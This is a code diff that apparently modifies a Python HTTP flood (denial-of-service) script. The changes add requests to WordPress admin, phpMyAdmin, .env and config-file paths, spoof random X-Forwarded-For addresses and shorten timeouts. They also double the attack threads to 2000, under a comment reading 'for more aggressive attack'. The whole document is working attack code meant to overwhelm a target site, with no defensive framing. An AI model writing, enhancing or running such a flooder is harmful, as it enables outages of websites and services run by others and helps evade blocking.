@@ -5,6 +5,7 @@ import threading
 import random
 import re
 import time
+import socket
 from urllib.parse import urlparse
 from headers import get_user_agents, get_referers
 
@@ -59,7 +60,19 @@ def httpcall(url):
         patterns = [
             url + '?' + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)),
             url + '/' + buildblock(random.randint(3,10)),
-            url + '?' + buildblock(random.randint(3,10)) + '=' + str(random.randint(1,999999))
+            url + '?' + buildblock(random.randint(3,10)) + '=' + str(random.randint(1,999999)),
+            url + '/wp-admin/' + buildblock(random.randint(3,10)),
+            url + '/wp-login.php',
+            url + '/admin/',
+            url + '/administrator/',
+            url + '/phpmyadmin/',
+            url + '/.env',
+            url + '/config.php',
+            url + '/wp-config.php',
+            url + '/wp-content/',
+            url + '/wp-includes/',
+            url + '/wp-json/',
+            url + '/xmlrpc.php'
         ]
         
         request = urllib.request.Request(random.choice(patterns))
@@ -73,8 +86,13 @@ def httpcall(url):
         request.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8')
         request.add_header('Accept-Language', 'en-US,en;q=0.5')
         request.add_header('Accept-Encoding', 'gzip, deflate')
+        request.add_header('X-Forwarded-For', f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
+        request.add_header('X-Requested-With', 'XMLHttpRequest')
         
-        response = urllib.request.urlopen(request, timeout=3)
+        # Set socket timeout to 1 second for faster requests
+        socket.setdefaulttimeout(1)
+        
+        response = urllib.request.urlopen(request, timeout=1)
         inc_counter()
         return response.getcode()
     except urllib.error.HTTPError as e:
@@ -90,6 +108,8 @@ class HTTPThread(threading.Thread):
         try:
             while flag<2:
                 httpcall(url)
+                # Add small delay to prevent overwhelming local resources
+                time.sleep(0.01)
         except:
             pass
 
@@ -129,7 +149,7 @@ if __name__ == '__main__':
         referer_list()
         
         # Increase number of threads for more aggressive attack
-        for i in range(1000):  # Increased to 1000 threads
+        for i in range(2000):  # Increased to 2000 threads
             t = HTTPThread()
             t.daemon = True
             t.start()
